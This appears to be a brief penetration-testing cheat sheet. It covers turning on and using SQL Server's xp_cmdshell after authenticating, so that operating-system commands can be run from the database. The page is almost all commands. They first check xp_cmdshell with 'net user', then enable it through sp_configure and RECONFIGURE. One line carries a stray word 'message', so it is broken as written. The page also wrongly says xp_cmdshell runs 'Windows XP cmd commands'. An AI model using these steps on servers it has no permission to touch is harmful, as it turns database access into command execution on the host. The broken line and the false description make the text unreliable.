# SQL

After successfully authenticating to a SQL Server \
It is worth a shot to verify if xp\_cmdshell has been previously activated with:\
`EXEC xp_cmdshell 'net user';`

If xp\_cmdshell has not been activated, run the below commands to activate and utilize Windows XP cmd commands within SQL

`EXEC sp_configure 'show advanced options', 1;`&#x20;

`RECONFIGURE; sp_configure;` - Enables sp\_configure&#x20;

`message EXEC sp_configure 'xp_cmdshell', 1;`&#x20;

`RECONFIGURE;`
